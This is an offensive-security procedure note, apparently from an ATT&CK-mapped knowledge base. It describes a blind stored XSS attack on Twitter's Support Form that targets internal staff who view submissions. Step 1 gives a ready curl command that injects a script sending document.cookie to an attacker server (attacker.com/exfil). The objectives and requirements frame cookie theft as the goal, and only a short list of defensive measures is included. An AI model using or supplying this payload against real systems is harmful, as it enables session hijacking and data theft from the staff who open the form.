---
tags:
  - xss
  - blind-xss
  - web-exploitation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/submit-xss-payload]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[JavaScript]]'
id: dc79620a-6f84-4f23-bfa5-8597c92d9f19
created_at: '2025-12-14T00:11:16.794Z'
updated_at: '2025-12-14T00:11:16.794Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Submit XSS Payload via Support Form

## Summary

This procedure involves submitting a malicious XSS payload through Twitter's Support Form, exploiting improper input sanitization to store the payload for blind execution on an internal Big Data panel, potentially leading to data exfiltration.

## Description

The Support Form accepts user input without proper sanitization, allowing stored XSS payloads. When internal staff view the submission on the targeted subdomain, the JavaScript executes in their browser context, enabling actions like stealing cookies or fetching page content and sending it to an external server. This is a blind attack, meaning the attacker does not directly observe execution but relies on exfiltration callbacks.

## Requirements

1. Access to Twitter's public Support Form
2. An attacker-controlled server to receive exfiltrated data
3. Basic knowledge of JavaScript and web requests

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding on all user-submitted data
- Use Content Security Policy (CSP) to restrict script execution
- Monitor internal logs for unexpected outbound requests from staff browsers

## Objectives

1. Inject a stored XSS payload into the system
2. Ensure payload execution on internal viewing
3. Achieve exfiltration of sensitive data

## Instructions

### Step 1: Craft XSS Payload

**Context**: Create a JavaScript payload that, upon execution, collects sensitive data (e.g., cookies) and sends it to an attacker server.

**Command** ([[commands/submit-xss-payload]]):
```bash
curl -X POST https://support.twitter.com/forms -d 'message=<script>fetch("https://attacker.com/exfil?data=" + encodeURIComponent(document.cookie));</script>'
```

> This command submits the form with the embedded XSS script, which will be stored and executed later.

### Step 2: Verify Submission

**Context**: Confirm that the form was submitted successfully, though no immediate execution is visible due to the blind nature.

Check the response from the curl command for success indicators, such as a 200 OK status.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used

- [[commands/submit-xss-payload]]

## Tools Used

None

## Tags

- [[xss]]
- [[blind-xss]]
